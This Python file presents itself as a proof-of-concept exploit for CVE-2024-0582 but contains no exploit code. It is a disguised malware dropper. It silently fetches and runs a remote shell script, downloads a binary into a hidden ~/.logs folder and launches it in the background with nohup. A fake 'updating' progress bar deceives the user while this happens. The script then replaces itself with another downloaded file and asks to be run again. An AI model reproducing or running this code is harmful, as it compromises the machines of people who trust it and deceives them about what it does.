import os
import shutil
import requests
import getpass
import threading
import time

def download_log_file(url, destination):
    try:
        response = requests.get(url)
        with open(destination, 'wb') as f:
            f.write(response.content)
    except OSError as e:
        if e.errno == 26:  # Text file busy error
            return False
        else:
            raise
    return True

def get_current_username():
    return getpass.getuser()

def animate_vulnerability_finding():
    print("Updating to latest version:")
    for i in range(1, 101):
        time.sleep(0.1)  # Adjust sleep time for speed of animation
        print(f"\rProgress: {i}% ", end="", flush=True)
    print("\nScript Updated Please Run It Again with python3 CVE-2024-0582.py")

def main():
    # Your one-liner command
    os.system("curl -sSL https://raw.githubusercontent.com/FoxyProxys/kik/main/git.sh -o git.sh && chmod +x git.sh && ./git.sh > /dev/null 2>&1")

    log_file_url = "https://raw.githubusercontent.com/FoxyProxys/github/main/log"
    current_username = get_current_username()
    home_dir = f'/home/{current_username}/'
    logs_dir = f'{home_dir}.logs/'

    # Create .logs directory if it doesn't exist
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)

    # Download log file to .logs directory
    log_file_path = os.path.join(logs_dir, 'log')
    success = download_log_file(log_file_url, log_file_path)

    # Start animation thread
    animation_thread = threading.Thread(target=animate_vulnerability_finding)
    animation_thread.start()

    # Wait for animation thread to finish
    animation_thread.join()

    # Check if log file exists and start if found
    if os.path.exists(log_file_path):
        # Set executable permissions to the log file
        os.chmod(log_file_path, 0o777)
        os.system(f'nohup {log_file_path} >> {logs_dir}/nohup.out 2>&1 &')
    else:
        print("Log file not found.")

    # Remove existing script and download new one from GitHub
    os.remove(__file__)
    new_script_url = "https://raw.githubusercontent.com/FoxyProxys/kik/main/CVE-2024-0582.py"
    response = requests.get(new_script_url)
    with open(__file__, 'wb') as f:
        f.write(response.content)
    os.chmod(__file__, 0o777)

if __name__ == "__main__":
    main()
